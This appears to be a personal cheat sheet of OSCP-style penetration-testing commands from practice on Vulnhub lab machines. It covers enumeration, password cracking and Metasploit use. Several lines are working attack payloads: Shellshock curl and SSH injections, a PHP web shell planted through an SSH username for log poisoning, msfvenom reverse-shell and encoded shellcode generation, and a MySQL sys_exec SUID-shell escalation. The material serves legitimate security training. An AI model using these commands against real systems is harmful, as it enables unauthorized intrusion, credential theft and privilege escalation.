---
title: OSCP Command
author: Yuchao
date: 2022-07-09 11:33:00 +0800
categories: [dev]
tags: [linux, oscp]
math: true
mermaid: true
---

From 0SCP-like Vulnhub boxes
- https://www.vulnhub.com/

# Commands
- ``` service smbd restart && dhclient eth0 ```
- ``` tcpdump -nnttttAr wireless.cap ```
- ``` tcpdump -nnttttAi lo ```
- ``` aircrack-ng -w wordlist.txt wireless.cap ```
- ``` netstat -antp ```
- ``` nmap -p- -A -T5 {IP} ```
- ``` dirb {IP} -u {usr}:{passwd} ```
- ``` zsteg -a suspicious.png ```
- ``` john --show --format=Raw-MD5 hashfile ```
- ``` ssh admin@{IP} -p6464 -t "bash --noprofile" ```
- https://ghidra-sre.org/
- ``` ssh-keygen ```
- ``` steghide extract -sf file.jpg ```
- ``` ls | sed s/\.jpg// ```
- ``` hydra -L wordlist -P wordlist {IP} ssh ```
- ``` rsmangler -m 6 -x 8 -r -d -e -i --punctuation -y -a -C --pna --nb --space --allow-duplicates -f wordlistOrigin -o newwordlist ```
- ``` history ```
- ``` msf> use windows/ftp/ftpshell_cli_bof ```
- ``` msf> session -i 1 ```
- ``` meterpreter> upload accesschk64.exe ```
- ``` meterpreter> shell ```
- ``` .\accesschk64.exe /accepteula -uwcqv ```
- ``` .\accesschk64.exe -uwqs Users c:\*.* ```
- ``` sc qc {service_name} ```
- ``` icacls "{service_path}" ```
- ``` tasklist /SVC ```
- ``` msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={port} -f exe -o file.exe ```
- ``` move a.exe b.exe ```
- ``` shutdown /r ```
- ``` meterpreter> run post/windows/manage/migrate ```
- ``` enum4linux {targetIP} ```
- ``` smbclient //{target_IP}/anonymous ```
- ``` smbclient //{target_IP}/helios -U helios ```
- ``` wpscan --url {url} --api-token {token} --enumerate p,u ```
- ``` cd /var/mail/user ```
- ``` telnet {IP} 25 ```
- ``` find / -uid 0 -perm -4000 -type f 2>/dev/null ```
- ``` john shadowfile --wordlist=/usr/share/wordlists/rockyou.txt ```
- ``` ./LinEnum.sh ```
- ``` ssh -L 8080:localhost:8080 aelus@192.168.56.156 ```
- ``` msf> set RHOSTS localhost ``` ssh tunnel
- ``` msf> set LHOST eth1 ``` ssh tunnel
- ``` msf> sessions -l ```
- ``` msf> sessions -i 1 ```
- ``` python -c 'import pty; pty' ```
- ``` sudo mysql -e '\! /bin/sh' ```
- ``` curl -H "user-agent: () {:;}; echo; echo; /bin/bash -c cat '/etc/passwd' " http://{IP}/cgi-bin/underworld ```
- ``` curl -A () " {echo h;}; echo; bin/ls -l " http://{IP}/cgi-bin/test.cgi ```
- ``` scp pspy32 hades@{IP}:/home/hades ```
- ``` ssh '<?php system($_GET["cmd"]);  ?>'@{IP}  ``` to interfere /var/log/auth
- ``` netstat -antup ```
- ``` ss -tulpn ```
- ``` socat tcp-listen:9999,reuseaddr,fork tcp:localhost:8080 ```
- ``` search python flask jsonpickle exploit ```
- ``` $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "{password_hash}") ```
- ``` ldapsearch -h {host} -p {port} -b "dc=symfonos,dc=local" -w '{password}' -D "cn=admin,dc=symfonos,dc=locol" ```
- ``` apt-get install hexchat ```
- ``` msf> use auxiliary/scanner/smtp/smtp_enum ```
- ``` find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null ```
- ``` find /etc/ -maxdepth 1 -name *.conf -type f 2>/dev/null | xargs ls -al ```
- ``` update-alternatives --config java ```
- ``` lsb_release -a ```
- ``` uname -a ```
- ``` https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh ```
- ``` find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2>/dev/null ```
- ``` crackstaion.net ``` crack hash
- ``` cat /etc/sudoers ```
- ``` echo os.system('/bin/bash') ```
- ``` grep -Hn textpattern * 2>/dev/null ```
- ``` ps aux | grep mysql ```
- ``` mysql> use mysql ```, ``` mysql> select * from mysql.func; ```
- ``` mysql> select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh') ```
- ``` hydra -L usernames -p {password} {IP} ssh -t1 ```
- ``` git clone https://github.com/lanjelot/patator.git ``` like hydra
- ``` fcrackzip -u -D -p wordlist file.zip ```
- ``` ssh -vv noob@{IP} -i noobkey ```
- ``` ssh noob@{IP} -i noobkey '() { :;}; echo SHELLSOCK' ```
- ``` ssh-keygen -b 2048 -t rsa ```
- ``` ./ssh/authorized_keys ```
- ``` find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null ```
- ``` ./program $(python3 -c 'print("a"*1000)') ```
- ``` locate pattern_create ```
- ``` locate pattern_offset ```
- ``` msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86 -e x86/shikata_ga_nai ```
- ``` dotdotpwn -m http -h {IP} -f config.php ```
